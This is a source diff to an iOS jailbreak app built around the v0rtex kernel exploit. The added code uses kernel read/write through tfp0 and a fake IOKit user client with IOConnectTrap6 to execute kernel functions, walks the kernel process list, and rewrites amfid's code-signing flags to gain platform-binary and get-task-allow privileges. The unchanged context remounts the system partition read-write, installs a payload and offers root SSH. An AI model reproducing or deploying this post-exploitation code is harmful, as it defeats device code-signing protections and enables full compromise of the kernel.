@@ -22,6 +22,19 @@
 #include <mach-o/loader.h>
 #include <sys/dir.h>
 #include <sys/utsname.h>
+#define OSDictionary_ItemCount(dict) rk32(dict+20)
+#define OSDictionary_ItemBuffer(dict) rk64(dict+32)
+#define OSDictionary_ItemKey(buffer, idx) rk64(buffer+16*idx)
+#define OSDictionary_ItemValue(buffer, idx) rk64(buffer+16*idx+8)
+#define OSString_CStringPtr(str) rk64(str+0x10)
+typedef mach_port_t io_connect_t;
+kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);
+
+#define CS_GET_TASK_ALLOW       0x0000004    /* has get-task-allow entitlement */
+#define CS_INSTALLER            0x0000008    /* has installer entitlement      */
+#define CS_HARD                 0x0000100    /* don't load invalid pages       */
+#define CS_RESTRICT             0x0000800    /* tell dyld to treat restricted  */
+#define CS_PLATFORM_BINARY      0x4000000    /* this is a platform binary      */
 
 @interface ViewController ()
 @property (weak, nonatomic) IBOutlet UITextView *outputView;
@@ -34,6 +47,26 @@ task_t tfp0;
 kptr_t kslide;
 kptr_t kern_ucred;
 kptr_t self_proc;
+
+mach_port_t user_client = MACH_PORT_NULL;
+
+static uint64_t kalloc(vm_size_t size){
+    mach_vm_address_t address = 0;
+    mach_vm_allocate(tfp0, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
+    return address;
+}
+
+uint64_t kexecute(mach_port_t user_client, uint64_t fake_client, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
+    
+    uint64_t offx20 = rk64(fake_client+0x40);
+    uint64_t offx28 = rk64(fake_client+0x48);
+    wk64(fake_client+0x40, x0);
+    wk64(fake_client+0x48, addr);
+    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
+    wk64(fake_client+0x40, offx20);
+    wk64(fake_client+0x48, offx28);
+    return returnval;
+}
 
 - (void)viewDidLoad {
     [super viewDidLoad];
@@ -65,6 +98,7 @@ kptr_t self_proc;
     kslide = 0;
     kern_ucred = 0;
     self_proc = 0;
+    
 	
     
     /* Use v0rtex exploit */
@@ -91,6 +125,100 @@ kptr_t self_proc;
     init_amfi(tfp0);
     init_kernel(tfp0);
     
+    uint32_t our_pid = getpid();
+    uint64_t our_proc = 0;
+    uint64_t kern_proc = 0;
+    uint64_t amfid_proc = 0;
+    uint32_t amfid_pid = 0;
+    uint64_t fake_client = kalloc(0x1000);
+    
+    uint64_t proc = rk64(kslide + 0xFFFFFFF0075E66F0);
+    while (proc)
+    {
+        uint32_t pid = (uint32_t)rk32(proc + OFFSET_PROC_P_PID);
+        char name[40] = {0};
+        kread(proc+0x268, name, 20);
+        if (pid == our_pid)
+        {
+            our_proc = proc;
+        }
+        else if (pid == 0)
+        {
+            kern_proc = proc;
+        }
+        else if (strstr(name, "amfid"))
+        {
+            printf("found amfid - getting task\n");
+            amfid_proc = proc;
+            amfid_pid = pid;
+            uint32_t csflags = rk32(proc + OFFSET_P_CSFLAGS);
+            wk32(proc + OFFSET_P_CSFLAGS, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
+        }
+        if (pid != 0) {
+            uint32_t csflags = rk32(proc + OFFSET_P_CSFLAGS);
+            printf("CSFlags for %s (PID: %d): 0x%x; ", name, pid, csflags);
+            
+            cpu_type_t cputype = rk32(proc + OFFSET_P_CPUTYPE);
+            cpu_subtype_t cpusubtype = rk32(proc + OFFSET_P_CPU_SUBTYPE);
+            
+            printf("\tCPU Type: 0x%x. Subtype: 0x%x\n", cputype, cpusubtype);
+            
+            uint64_t ucreds = rk64(proc + OFFSET_PROC_UCRED);
+            uint64_t amfi_entitlements = rk64(rk64(ucreds + 0x78) + 0x8);
+            printf("\tAMFI Entitlements at 0x%llx\n", amfi_entitlements);
+            
+            uint64_t textvp = rk64(proc + OFFSET_P_TEXTVP); //vnode of executable
+            off_t textoff = rk64(proc + OFFSET_P_TEXTOFF);
+            
+            printf("\t__TEXT at 0x%llx. Offset: 0x%llx\n", textvp, textoff);
+            
+            if (textvp != 0){
+                uint32_t vnode_type_tag = rk32(textvp + OFFSET_V_TYPE);
+                uint16_t vnode_type = vnode_type_tag & 0xffff;
+                uint16_t vnode_tag = (vnode_type_tag >> 16);
+                printf("\tVNode Type: 0x%x. Tag: 0x%x.\n", vnode_type, vnode_tag);
+                
+                if (vnode_type == 1){
+                    uint64_t ubcinfo = rk64(textvp + OFFSET_V_UBCINFO);
+                    printf("\t\tUBCInfo at 0x%llx.\n", ubcinfo);
+                    
+                    uint64_t csblobs = rk64(ubcinfo + OFFSET_UBCINFO_CSBLOBS);
+                    while (csblobs != 0){
+                        printf("\t\t\tCSBlobs at 0x%llx.\n", csblobs);
+                        
+                        cpu_type_t csblob_cputype = rk32(csblobs + OFFSET_CSB_CPUTYPE);
+                        unsigned int csblob_flags = rk32(csblobs + OFFSET_CSB_FLAGS);
+                        off_t csb_base_offset = rk64(csblobs + OFFSET_CSB_BASE);
+                        uint64_t csb_entitlements = rk64(csblobs + OFFSET_CSB_ENTITLEMENTS);
+                        unsigned int csb_signer_type = rk32(csblobs + OFFSET_CSB_SIGNER_TYPE);
+                        unsigned int csb_platform_binary = rk32(csblobs + OFFSET_CSB_PLATFORM_BINARY);
+                        unsigned int csb_platform_path = rk32(csblobs + OFFSET_CSB_PLATFORM_PATH);
+                        
+                        printf("\t\t\tCSBlob CPU Type: 0x%x. Flags: 0x%x. Offset: 0x%llx\n", csblob_cputype, csblob_flags, csb_base_offset);
+                        
+                        printf("\t\t\tCSBlob Signer Type: 0x%x. Platform Binary: %d Path: %d\n", csb_signer_type, csb_platform_binary, csb_platform_path);
+                        
+                        printf("\t\t\t\tEntitlements at 0x%llx.\n", csb_entitlements);
+                        
+                        for (int idx = 0; idx < OSDictionary_ItemCount(csb_entitlements); idx++) {
+                            uint64_t key = OSDictionary_ItemKey(OSDictionary_ItemBuffer(csb_entitlements), idx);
+                            uint64_t keyOSStr = OSString_CStringPtr(key);
+                            size_t length = kexecute(user_client, fake_client, 0xFFFFFFF00709BDE0+kslide, keyOSStr, 0, 0, 0, 0, 0, 0);
+                            char* s = (char*)calloc(length+1, 1);
+                            kread(keyOSStr, s, length);
+                            printf("\t\t\t\t\tEntitlement: %s\n", s);
+                            free(s);
+                        }
+                        
+                        csblobs = rk64(csblobs);
+                    }
+                }
+            }
+        }
+        proc = rk64(proc);
+    }
+    
+    
     
     /* Remount system partition as r/w */
     
@@ -101,7 +229,6 @@ kptr_t self_proc;
         return;
     }
     [self writeText:@"remounted system partition as r/w ✅"];
-
     
     /* Install payload */
     
@@ -192,7 +319,6 @@ kptr_t self_proc;
     [self writeText:@"* to connect:ssh -p2222 root@{YOUR_DEVICE_IP}"];
     [self writeText:@"\n"];
     
-    
     /* The End. */
     
     [self writeText:@"All done, peace!"];
@@ -241,11 +367,6 @@ int execprog(uint64_t kern_ucred, const char *prog, const char* args[]) {
     
     printf("process spawned with pid %d \n", pd);
     
-    #define CS_GET_TASK_ALLOW       0x0000004    /* has get-task-allow entitlement */
-    #define CS_INSTALLER            0x0000008    /* has installer entitlement      */
-    #define CS_HARD                 0x0000100    /* don't load invalid pages       */
-    #define CS_RESTRICT             0x0000800    /* tell dyld to treat restricted  */
-    #define CS_PLATFORM_BINARY      0x4000000    /* this is a platform binary      */
     
     /*
      1. read 8 bytes from proc+0x100 into self_ucred
